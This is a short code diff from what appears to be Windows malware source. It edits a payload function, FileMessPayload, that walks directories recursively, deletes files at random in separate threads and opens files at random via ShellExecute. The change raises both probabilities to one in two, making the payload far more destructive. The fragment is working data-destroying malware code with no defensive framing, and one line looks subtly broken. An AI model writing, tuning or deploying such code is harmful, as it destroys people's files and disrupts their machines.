@@ -660,12 +660,12 @@ void FileMessPayload(PWSTR szDirectory) {
 			lstrcat(szPath, L"\\");
 			FileMessPayload(szPath);
 		}
-		else if (random() % 50 == 0 && wcslen(szPath) < 260) {
+		else if (random() % 2 == 0 && wcslen(szPath) < 260) {
 			szPath[wcslen(szPath)] = '\0\0';
 			CreateThread(NULL, 0, LPTHREAD_START_ROUTINE(DeleteThread), (PVOID)szPath, 0, NULL);
 			Sleep(500);
 		}
-		else if (random() % 20 == 0) {
+		else if (random() % 2 == 0) {
 			ShellExecute(NULL, L"open", szPath, NULL, szDirectory, SW_SHOW);
 			Sleep(500);
 		}
